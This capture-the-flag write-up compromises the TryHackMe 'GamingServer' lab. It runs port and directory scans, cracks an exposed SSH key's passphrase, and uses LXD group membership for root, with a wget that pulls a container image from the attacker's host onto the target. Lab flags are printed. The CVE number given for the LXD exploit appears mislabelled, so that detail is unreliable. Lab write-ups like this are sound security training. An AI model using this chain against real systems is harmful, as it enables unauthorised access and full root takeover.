# GamingServer – TryHackMe Write-up

## Reconnaissance

The first step was to verify connectivity with the target:

```bash
ping 10.128.132.33
```

The host responded successfully, confirming the machine was reachable.

Next, I performed a port scan using Nmap:

```bash
nmap -sV -sC -oN scan 10.128.132.33
```

### Open ports discovered:

- 22/tcp → OpenSSH 7.6p1 (Ubuntu)
    
- 80/tcp → Apache HTTP Server 2.4.29
    

The web server on port 80 was identified as the main attack surface.

---

## Web Enumeration

Browsing the website showed a simple page titled:

> “House of danak”

While inspecting the page source, I found an interesting comment:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

This revealed a possible username: **john**

---

## Directory Enumeration

I used ffuf to discover hidden directories:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.132.33/FUZZ
```

### Discovered endpoints:

- `/secret` (301 redirect)
    
- `/uploads` (301 redirect)
    
- `robots.txt`
    
- `index.html`
    

---

## Information Disclosure

Inside `/secret/secretKey`, I found a **private SSH key (id_rsa)**.

Inside `/uploads/`, I discovered a file:

```
dict.lst
```

This looked like a password dictionary.

---

## SSH Key Cracking

The private key was encrypted, so I converted it into a crackable format using:

```bash
ssh2john id_rsa > hash.txt
```

Then I cracked it using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Result:

```
letmein
```

---

## SSH Access

I set proper permissions for the key:

```bash
chmod 600 id_rsa
```

Then logged in as user **john**:

```bash
ssh -i id_rsa john@10.128.132.33
```

After entering the passphrase, access was granted successfully.

---

## User Flag

Inside the home directory:

```bash
cat user.txt
```

Flag:

```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

## Privilege Escalation

System enumeration showed that the machine was running Ubuntu 18.04 with LXD installed, and the current user was a member of the `lxd` group.

I used the known exploit:

- CVE-2018-15664 (LXD privilege escalation)
    
- Exploit reference: [https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)
    

### Steps performed:

1. Built a malicious Alpine image locally:
    

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine
```

This generated:

```
alpine-v3.23-x86_64-20260511_1946.tar.gz
```

2. Hosted the file locally and transferred it to the target:
    

```bash
wget http://192.168.128.91:8000/alpine-v3.23-x86_64-20260511_1946.tar.gz
```

3. Executed the exploit script:
    

```bash
chmod +x exploit.sh
./exploit.sh -f alpine-v3.23-x86_64-20260511_1946.tar.gz
```

---

## Root Access

The exploit successfully created a privileged container.
I mounted the host filesystem and accessed `/root`:

```bash
cd /mnt/root/root
cat root.txt
```

---

## Root Flag

```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

---

## Conclusion

The machine was compromised through a chain of vulnerabilities:

1. Information disclosure in source code
    
2. Directory enumeration exposing sensitive files
    
3. Exposed SSH private key
    
4. Weak passphrase cracked using wordlist
    
5. LXD privilege escalation to root